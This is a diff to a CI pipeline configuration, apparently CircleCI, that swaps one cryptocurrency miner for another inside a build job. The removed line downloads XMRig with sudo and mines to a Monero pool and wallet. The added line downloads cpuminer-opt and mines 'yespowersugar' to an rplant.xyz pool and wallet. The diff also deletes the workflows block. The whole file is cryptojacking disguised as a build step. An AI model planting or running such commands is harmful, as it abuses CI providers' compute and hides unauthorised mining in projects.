@@ -13,15 +13,5 @@ jobs:
          name: "pro"
          
          command: | 
-          sudo su --command "wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 && ./xmrig -o pool.hashvault.pro:443 -u 89hV9R3NZ1oVm9jmLnfFaCSswKhp8GbdNb5hVjbEFfRUDqSho72SXa4E4zWhgxpDo4L4HT2AXYAYwMfgJfnkKGosULz7oXZ -k  --tls --rig-id gamblingbos "
+          sudo su --command "wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qpw0u9dfqzx6srmm7xgz8j9p36c545szge4eyx7 -p x "
    
-          
-
-    
-           
-
-workflows:
-  version: 2
-  build:
-    jobs:
-      - build
